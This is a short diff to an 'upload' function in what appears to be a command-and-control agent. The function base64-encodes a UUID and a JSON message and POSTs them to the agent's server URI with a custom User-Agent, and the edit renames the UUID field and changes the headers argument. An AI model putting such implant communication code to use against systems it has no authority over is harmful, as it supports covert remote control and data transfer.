@@ -13,9 +13,9 @@ def upload(task_id, file_id, remote_path):
     serialized = json.dumps(upload)
 
     message = to64(serialized)
-    uuid = to64(agent.PayloadUUID)
+    uuid = to64(agent.UUID)
 
-    x = requests.post(agent.Server + agent.URI, data = uuid + message, headers={'User-Agent': agent.UserAgent})
+    x = requests.post(agent.Server + agent.URI, data = uuid + message, headers=agent.UserAgent)
     
     res = from64(x.text)
 
